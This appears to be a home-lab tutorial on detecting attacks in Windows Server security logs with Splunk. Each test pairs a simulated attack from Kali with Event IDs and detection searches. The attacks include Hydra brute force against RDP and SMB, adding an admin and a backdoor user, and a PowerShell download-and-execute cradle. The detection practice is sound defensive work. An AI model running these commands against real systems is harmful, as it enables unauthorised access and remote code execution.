# Windows Server Log Analysis

Assumptions:

- Windows Server 2019 has Splunk Universal Forwarder installed

- Security logs are being forwarded

- You enabled Security Event Log input in Splunk

- Kali is attacker

## TEST 1 — RDP Brute Force Attack


#### From Kali

Use Hydra against RDP:

```bash
hydra -t 4 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<WINDOWS_IP>
```

This simulates password guessing on RDP.

---

#### What Should Be Logged on Windows?

Security Event ID:

- **4625** → Failed login

- **4624** → Successful login

- Logon Type 10 → RDP login


---

#### Detect in Splunk

Search failed RDP logins:

```spl
index=* sourcetype=WinEventLog:Security EventCode=4625 Logon_Type=10
```

Count by attacker IP:

```spl
index=* EventCode=4625 Logon_Type=10
| stats count by IpAddress
| sort -count
```

Brute force detection rule:

```spl
index=* EventCode=4625 Logon_Type=10
| stats count by IpAddress
| where count > 5
```

That’s your detection.

---

## TEST 2 — SMB Brute Force

From Kali:

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://<WINDOWS_IP>
```

Windows logs:

- Event ID 4625
    
- Logon Type 3 (Network login)
    

Search:

```spl
index=* EventCode=4625 Logon_Type=3
| stats count by IpAddress
```

---

## TEST 3 — Account Lockout Attack

Trigger lockout by failing password multiple times.

Windows logs:

- Event ID 4740 → Account locked
    

Search:

```spl
index=* EventCode=4740
```

Find who caused it:

```spl
index=* EventCode=4740
| table _time TargetUserName Caller_Computer_Name
```

---

## TEST 4 — Privilege Escalation Simulation

On Windows server:

Add user to Administrators group:

```powershell
net localgroup administrators testuser /add
```

Windows logs:

- Event ID 4732 → User added to security-enabled local group
    

Search:

```spl
index=* EventCode=4732
```

Check who was added:

```spl
index=* EventCode=4732
| table _time MemberName SubjectUserName
```

---

## TEST 5 — Suspicious PowerShell Execution

On Windows server:

```powershell
powershell -EncodedCommand SQBFAFgA
```

Or simple:

```powershell
powershell IEX(New-Object Net.WebClient).DownloadString('http://example.com/test.ps1')
```

If PowerShell logging enabled, you get:

- Event ID 4104 → Script block logging
    

Search:

```spl
index=* EventCode=4104
```

---

## TEST 6 — Create New User (Persistence)

On Windows:

```powershell
net user hacker Pass123! /add
```

Logs:

- Event ID 4720 → User created
    

Search:

```spl
index=* EventCode=4720
```

---


### Real SOC-Level Detection Query

Brute Force Detection:

```spl
index=* EventCode=4625
| stats count by IpAddress
| where count > 10
```

Suspicious Admin Group Addition:

```spl
index=* EventCode=4732
| search MemberName="*"
```

---

### Extra Realistic Attack (Advanced)

From Kali use:

- CrackMapExec

- Impacket psexec

- SMBexec

- Crowbar


Example:

```bash
crackmapexec smb <WINDOWS_IP> -u administrator -p password
```

That generates authentication logs you can detect.

---

